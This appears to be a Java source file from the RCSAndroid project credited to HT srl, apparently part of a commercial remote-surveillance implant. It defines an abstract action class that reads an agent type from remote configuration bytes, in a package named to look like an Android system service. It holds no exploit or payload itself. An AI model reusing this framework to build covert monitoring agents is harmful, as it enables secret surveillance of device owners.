/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSAndroid
 * File         : StopAgentAction.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.service.action;

import java.io.IOException;

import android.util.Log;

import com.android.service.agent.AgentManager;
import com.android.service.agent.AgentType;
import com.android.service.util.DataBuffer;

// TODO: Auto-generated Javadoc
/**
 * The Class StopAgentAction.
 */
public abstract class AgentAction extends SubAction {
	private static final String TAG = "AgentAction";
	
	protected AgentType agentId;
	
	/**
	 * Instantiates a new stop agent action.
	 * 
	 * @param type
	 *            the type
	 * @param confParams
	 *            the conf params
	 */
	public AgentAction(final SubActionType type, final byte[] confParams) {
		super(type, confParams);
	}

	@Override
	protected boolean parse(byte[] params) {
		final DataBuffer databuffer = new DataBuffer(params, 0, params.length);
		try {
			int type = databuffer.readInt();
			agentId = AgentType.get(type);

		} catch (final IOException e) {
			Log.d("QZ", TAG + " (parse) Error: " + e.toString());
			return false;
		}

		return true;
	}

}
